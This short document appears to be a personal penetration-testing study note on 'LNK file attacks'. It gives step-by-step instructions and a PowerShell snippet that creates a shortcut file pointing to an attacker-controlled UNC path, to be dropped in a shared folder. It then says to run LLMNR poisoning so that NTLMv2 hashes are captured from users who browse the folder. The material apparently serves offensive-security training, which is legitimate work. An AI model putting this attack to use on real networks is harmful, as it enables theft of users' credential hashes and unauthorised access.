---
tags:
  - PEH
---
## Definition
Placing a malicious file in a shared folder.
## Executing LNK File Attacks
1. From the victim's computer, navigate to a shared folder
2. Paste the following code line by line **from a privileged PowerShell**
```bash
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\<attacker's-ip-address>\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```
3. Run [[LLMNR Poisoning]] attack and wait for captured NTLMv2 hashes